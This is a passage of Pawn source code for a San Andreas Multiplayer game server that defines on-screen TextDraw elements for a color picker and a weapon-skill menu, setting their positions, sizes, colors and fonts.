	color_menu_global_td[7] = TextDrawCreate(397.500427, 188.325164, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[7], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[7], 26.000000, 22.469987);
	TextDrawAlignment(color_menu_global_td[7], 1);
	TextDrawColor(color_menu_global_td[7], 419954943);
	TextDrawSetShadow(color_menu_global_td[7], 0);
	TextDrawSetOutline(color_menu_global_td[7], 0);
	TextDrawBackgroundColor(color_menu_global_td[7], 255);
	TextDrawFont(color_menu_global_td[7], 4);
	TextDrawSetProportional(color_menu_global_td[7], 0);
	TextDrawSetShadow(color_menu_global_td[7], 0);

	color_menu_global_td[8] = TextDrawCreate(213.500244, 277.650115, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[8], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[8], 26.000000, 22.469987);
	TextDrawAlignment(color_menu_global_td[8], 1);
	TextDrawColor(color_menu_global_td[8], 419954943);
	TextDrawSetShadow(color_menu_global_td[8], 0);
	TextDrawSetOutline(color_menu_global_td[8], 0);
	TextDrawBackgroundColor(color_menu_global_td[8], 255);
	TextDrawFont(color_menu_global_td[8], 4);
	TextDrawSetProportional(color_menu_global_td[8], 0);
	TextDrawSetShadow(color_menu_global_td[8], 0);

	color_menu_global_td[9] = TextDrawCreate(397.500152, 277.650115, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[9], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[9], 26.000000, 22.469987);
	TextDrawAlignment(color_menu_global_td[9], 1);
	TextDrawColor(color_menu_global_td[9], 419954943);
	TextDrawSetShadow(color_menu_global_td[9], 0);
	TextDrawSetOutline(color_menu_global_td[9], 0);
	TextDrawBackgroundColor(color_menu_global_td[9], 255);
	TextDrawFont(color_menu_global_td[9], 4);
	TextDrawSetProportional(color_menu_global_td[9], 0);
	TextDrawSetShadow(color_menu_global_td[9], 0);

	color_menu_global_td[10] = TextDrawCreate(228.000030, 193.687377, "box");
	TextDrawLetterSize(color_menu_global_td[10], 0.000000, 11.199081);
	TextDrawTextSize(color_menu_global_td[10], 409.000000, 0.000000);
	TextDrawAlignment(color_menu_global_td[10], 1);
	TextDrawColor(color_menu_global_td[10], -1);
	TextDrawUseBox(color_menu_global_td[10], 1);
	TextDrawBoxColor(color_menu_global_td[10], 419954943);
	TextDrawSetShadow(color_menu_global_td[10], 0);
	TextDrawSetOutline(color_menu_global_td[10], 0);
	TextDrawBackgroundColor(color_menu_global_td[10], 255);
	TextDrawFont(color_menu_global_td[10], 1);
	TextDrawSetProportional(color_menu_global_td[10], 1);
	TextDrawSetShadow(color_menu_global_td[10], 0);

	color_menu_global_td[11] = TextDrawCreate(219.900054, 200.750122, "box");
	TextDrawLetterSize(color_menu_global_td[11], 0.000000, 9.649080);
	TextDrawTextSize(color_menu_global_td[11], 417.229248, 0.000000);
	TextDrawAlignment(color_menu_global_td[11], 1);
	TextDrawColor(color_menu_global_td[11], -1);
	TextDrawUseBox(color_menu_global_td[11], 1);
	TextDrawBoxColor(color_menu_global_td[11], 419954943);
	TextDrawSetShadow(color_menu_global_td[11], 0);
	TextDrawSetOutline(color_menu_global_td[11], 0);
	TextDrawBackgroundColor(color_menu_global_td[11], 255);
	TextDrawFont(color_menu_global_td[11], 1);
	TextDrawSetProportional(color_menu_global_td[11], 1);
	TextDrawSetShadow(color_menu_global_td[11], 0);

	color_menu_global_td[12] = TextDrawCreate(221.799926, 195.600128, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[12], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[12], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[12], 1);
	TextDrawColor(color_menu_global_td[12], -1382874881);
	TextDrawSetShadow(color_menu_global_td[12], 0);
	TextDrawSetOutline(color_menu_global_td[12], 0);
	TextDrawBackgroundColor(color_menu_global_td[12], 255);
	TextDrawFont(color_menu_global_td[12], 4);
	TextDrawSetProportional(color_menu_global_td[12], 0);
	TextDrawSetShadow(color_menu_global_td[12], 0);

	color_menu_global_td[13] = TextDrawCreate(259.202209, 195.600128, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[13], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[13], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[13], 1);
	TextDrawColor(color_menu_global_td[13], -1382874881);
	TextDrawSetShadow(color_menu_global_td[13], 0);
	TextDrawSetOutline(color_menu_global_td[13], 0);
	TextDrawBackgroundColor(color_menu_global_td[13], 255);
	TextDrawFont(color_menu_global_td[13], 4);
	TextDrawSetProportional(color_menu_global_td[13], 0);
	TextDrawSetShadow(color_menu_global_td[13], 0);

	color_menu_global_td[14] = TextDrawCreate(297.004516, 195.600128, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[14], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[14], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[14], 1);
	TextDrawColor(color_menu_global_td[14], -1382874881);
	TextDrawSetShadow(color_menu_global_td[14], 0);
	TextDrawSetOutline(color_menu_global_td[14], 0);
	TextDrawBackgroundColor(color_menu_global_td[14], 255);
	TextDrawFont(color_menu_global_td[14], 4);
	TextDrawSetProportional(color_menu_global_td[14], 0);
	TextDrawSetShadow(color_menu_global_td[14], 0);

	color_menu_global_td[15] = TextDrawCreate(335.506866, 195.600128, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[15], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[15], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[15], 1);
	TextDrawColor(color_menu_global_td[15], -1382874881);
	TextDrawSetShadow(color_menu_global_td[15], 0);
	TextDrawSetOutline(color_menu_global_td[15], 0);
	TextDrawBackgroundColor(color_menu_global_td[15], 255);
	TextDrawFont(color_menu_global_td[15], 4);
	TextDrawSetProportional(color_menu_global_td[15], 0);
	TextDrawSetShadow(color_menu_global_td[15], 0);

	color_menu_global_td[16] = TextDrawCreate(373.609191, 195.600128, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[16], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[16], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[16], 1);
	TextDrawColor(color_menu_global_td[16], -1382874881);
	TextDrawSetShadow(color_menu_global_td[16], 0);
	TextDrawSetOutline(color_menu_global_td[16], 0);
	TextDrawBackgroundColor(color_menu_global_td[16], 255);
	TextDrawFont(color_menu_global_td[16], 4);
	TextDrawSetProportional(color_menu_global_td[16], 0);
	TextDrawSetShadow(color_menu_global_td[16], 0);

	color_menu_global_td[17] = TextDrawCreate(221.799926, 226.201995, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[17], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[17], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[17], 1);
	TextDrawColor(color_menu_global_td[17], -1382874881);
	TextDrawSetShadow(color_menu_global_td[17], 0);
	TextDrawSetOutline(color_menu_global_td[17], 0);
	TextDrawBackgroundColor(color_menu_global_td[17], 255);
	TextDrawFont(color_menu_global_td[17], 4);
	TextDrawSetProportional(color_menu_global_td[17], 0);
	TextDrawSetShadow(color_menu_global_td[17], 0);

	color_menu_global_td[18] = TextDrawCreate(259.202209, 226.201995, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[18], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[18], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[18], 1);
	TextDrawColor(color_menu_global_td[18], -1382874881);
	TextDrawSetShadow(color_menu_global_td[18], 0);
	TextDrawSetOutline(color_menu_global_td[18], 0);
	TextDrawBackgroundColor(color_menu_global_td[18], 255);
	TextDrawFont(color_menu_global_td[18], 4);
	TextDrawSetProportional(color_menu_global_td[18], 0);
	TextDrawSetShadow(color_menu_global_td[18], 0);

	color_menu_global_td[19] = TextDrawCreate(297.004516, 226.201995, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[19], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[19], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[19], 1);
	TextDrawColor(color_menu_global_td[19], -1382874881);
	TextDrawSetShadow(color_menu_global_td[19], 0);
	TextDrawSetOutline(color_menu_global_td[19], 0);
	TextDrawBackgroundColor(color_menu_global_td[19], 255);
	TextDrawFont(color_menu_global_td[19], 4);
	TextDrawSetProportional(color_menu_global_td[19], 0);
	TextDrawSetShadow(color_menu_global_td[19], 0);

	color_menu_global_td[20] = TextDrawCreate(335.506866, 226.201995, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[20], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[20], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[20], 1);
	TextDrawColor(color_menu_global_td[20], -1382874881);
	TextDrawSetShadow(color_menu_global_td[20], 0);
	TextDrawSetOutline(color_menu_global_td[20], 0);
	TextDrawBackgroundColor(color_menu_global_td[20], 255);
	TextDrawFont(color_menu_global_td[20], 4);
	TextDrawSetProportional(color_menu_global_td[20], 0);
	TextDrawSetShadow(color_menu_global_td[20], 0);

	color_menu_global_td[21] = TextDrawCreate(373.609191, 226.201995, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[21], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[21], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[21], 1);
	TextDrawColor(color_menu_global_td[21], -1382874881);
	TextDrawSetShadow(color_menu_global_td[21], 0);
	TextDrawSetOutline(color_menu_global_td[21], 0);
	TextDrawBackgroundColor(color_menu_global_td[21], 255);
	TextDrawFont(color_menu_global_td[21], 4);
	TextDrawSetProportional(color_menu_global_td[21], 0);
	TextDrawSetShadow(color_menu_global_td[21], 0);

	color_menu_global_td[22] = TextDrawCreate(221.799926, 257.903930, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[22], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[22], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[22], 1);
	TextDrawColor(color_menu_global_td[22], -1382874881);
	TextDrawSetShadow(color_menu_global_td[22], 0);
	TextDrawSetOutline(color_menu_global_td[22], 0);
	TextDrawBackgroundColor(color_menu_global_td[22], 255);
	TextDrawFont(color_menu_global_td[22], 4);
	TextDrawSetProportional(color_menu_global_td[22], 0);
	TextDrawSetShadow(color_menu_global_td[22], 0);

	color_menu_global_td[23] = TextDrawCreate(259.202209, 257.903930, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[23], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[23], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[23], 1);
	TextDrawColor(color_menu_global_td[23], -1382874881);
	TextDrawSetShadow(color_menu_global_td[23], 0);
	TextDrawSetOutline(color_menu_global_td[23], 0);
	TextDrawBackgroundColor(color_menu_global_td[23], 255);
	TextDrawFont(color_menu_global_td[23], 4);
	TextDrawSetProportional(color_menu_global_td[23], 0);
	TextDrawSetShadow(color_menu_global_td[23], 0);

	color_menu_global_td[24] = TextDrawCreate(297.004516, 257.903930, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[24], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[24], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[24], 1);
	TextDrawColor(color_menu_global_td[24], -1382874881);
	TextDrawSetShadow(color_menu_global_td[24], 0);
	TextDrawSetOutline(color_menu_global_td[24], 0);
	TextDrawBackgroundColor(color_menu_global_td[24], 255);
	TextDrawFont(color_menu_global_td[24], 4);
	TextDrawSetProportional(color_menu_global_td[24], 0);
	TextDrawSetShadow(color_menu_global_td[24], 0);

	color_menu_global_td[25] = TextDrawCreate(335.506866, 257.903930, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[25], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[25], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[25], 1);
	TextDrawColor(color_menu_global_td[25], -1382874881);
	TextDrawSetShadow(color_menu_global_td[25], 0);
	TextDrawSetOutline(color_menu_global_td[25], 0);
	TextDrawBackgroundColor(color_menu_global_td[25], 255);
	TextDrawFont(color_menu_global_td[25], 4);
	TextDrawSetProportional(color_menu_global_td[25], 0);
	TextDrawSetShadow(color_menu_global_td[25], 0);

	color_menu_global_td[26] = TextDrawCreate(373.609191, 257.903930, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[26], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[26], 41.069820, 35.000000);
	TextDrawAlignment(color_menu_global_td[26], 1);
	TextDrawColor(color_menu_global_td[26], -1382874881);
	TextDrawSetShadow(color_menu_global_td[26], 0);
	TextDrawSetOutline(color_menu_global_td[26], 0);
	TextDrawBackgroundColor(color_menu_global_td[26], 255);
	TextDrawFont(color_menu_global_td[26], 4);
	TextDrawSetProportional(color_menu_global_td[26], 0);
	TextDrawSetShadow(color_menu_global_td[26], 0);

	TDEditor_SKILL_GLOBAL[0] =  TextDrawCreate(184.498962, 162.637512, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[0], 0.000000, 15.437102);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[0], 465.000000, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[0], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[0], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[0], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[0], 882573055);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[0], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[0], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[0], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[0], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[0], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[0], 0);

	TDEditor_SKILL_GLOBAL[1] = TextDrawCreate(185.100799, 174.275909, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[1], 0.000000, 14.048258);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[1], 464.000000, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[1], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[1], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[1], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[1], 356609791);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[1], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[1], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[1], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[1], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[1], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[1], 0);

	TDEditor_SKILL_GLOBAL[2] = TextDrawCreate(187.498229, 177.087432, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[2], 0.000000, 5.500000);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[2], 250.998229, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[2], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[2], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[2], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[2], 882573055);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[2], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[2], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[2], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[2], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[2], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[2], 0);

	TDEditor_SKILL_GLOBAL[3] = TextDrawCreate(257.902526, 177.087432, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[3], 0.000000, 5.500000);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[3], 321.402526, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[3], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[3], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[3], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[3], 882573055);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[3], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[3], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[3], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[3], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[3], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[3], 0);

	TDEditor_SKILL_GLOBAL[4] = TextDrawCreate(328.306823, 177.087432, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[4], 0.000000, 5.500000);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[4], 391.806823, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[4], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[4], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[4], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[4], 882573055);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[4], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[4], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[4], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[4], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[4], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[4], 0);

	TDEditor_SKILL_GLOBAL[5] = TextDrawCreate(187.298217, 231.890777, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[5], 0.000000, 5.500000);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[5], 250.798217, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[5], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[5], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[5], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[5], 882573055);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[5], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[5], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[5], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[5], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[5], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[5], 0);

	TDEditor_SKILL_GLOBAL[6] = TextDrawCreate(257.702514, 232.090789, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[6], 0.000000, 5.500000);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[6], 321.202514, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[6], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[6], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[6], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[6], 882573055);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[6], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[6], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[6], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[6], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[6], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[6], 0);

	TDEditor_SKILL_GLOBAL[7] = TextDrawCreate(328.106811, 231.990783, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[7], 0.000000, 5.500000);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[7], 391.606811, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[7], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[7], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[7], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[7], 882573055);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[7], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[7], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[7], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[7], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[7], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[7], 0);

	TDEditor_SKILL_GLOBAL[8] = TextDrawCreate(188.400451, 178.038024, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[8], 0.000000, 5.261013);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[8], 250.000000, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[8], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[8], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[8], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[8], 356609791);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[8], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[8], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[8], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[8], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[8], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[8], 0);

	TDEditor_SKILL_GLOBAL[9] = TextDrawCreate(258.700469, 177.887908, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[9], 0.000000, 5.287023);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[9], 320.359375, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[9], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[9], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[9], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[9], 356609791);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[9], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[9], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[9], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[9], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[9], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[9], 0);

	TDEditor_SKILL_GLOBAL[10] = TextDrawCreate(329.300476, 177.700531, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[10], 0.000000, 5.328020);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[10], 390.570556, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[10], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[10], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[10], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[10], 356609791);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[10], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[10], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[10], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[10], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[10], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[10], 0);

	TDEditor_SKILL_GLOBAL[11] = TextDrawCreate(188.400299, 233.088073, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[11], 0.000000, 5.278018);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[11], 249.870620, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[11], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[11], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[11], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[11], 356609791);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[11], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[11], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[11], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[11], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[11], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[11], 0);

	TDEditor_SKILL_GLOBAL[12] = TextDrawCreate(258.698577, 232.787841, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[12], 0.000000, 5.328019);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[12], 320.467620, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[12], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[12], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[12], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[12], 356609791);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[12], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[12], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[12], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[12], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[12], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[12], 0);

	TDEditor_SKILL_GLOBAL[13] = TextDrawCreate(329.298675, 232.900268, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[13], 0.000000, 5.302021);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[13], 391.000000, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[13], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[13], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[13], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[13], 356609791);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[13], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[13], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[13], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[13], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[13], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[13], 0);

	TDEditor_SKILL_GLOBAL[14] = TextDrawCreate(218.993621, 185.574676, "SDPISTOL");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[14], 0.198999, 1.434375);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[14], 2);
	TextDrawColor(TDEditor_SKILL_GLOBAL[14], -1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[14], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[14], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[14], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[14], 2);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[14], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[14], 0);

	TDEditor_SKILL_GLOBAL[15] = TextDrawCreate(289.797943, 185.574676, "deserteagle");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[15], 0.188997, 1.434375);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[15], 2);
	TextDrawColor(TDEditor_SKILL_GLOBAL[15], -1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[15], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[15], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[15], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[15], 2);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[15], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[15], 0);

	TDEditor_SKILL_GLOBAL[16] = TextDrawCreate(360.302246, 185.574676, "shotgun");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[16], 0.188997, 1.434375);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[16], 2);
	TextDrawColor(TDEditor_SKILL_GLOBAL[16], -1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[16], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[16], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[16], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[16], 2);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[16], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[16], 0);

	TDEditor_SKILL_GLOBAL[17] = TextDrawCreate(218.302276, 240.262176, "mp5");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[17], 0.188997, 1.434375);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[17], 2);
	TextDrawColor(TDEditor_SKILL_GLOBAL[17], -1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[17], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[17], 0);
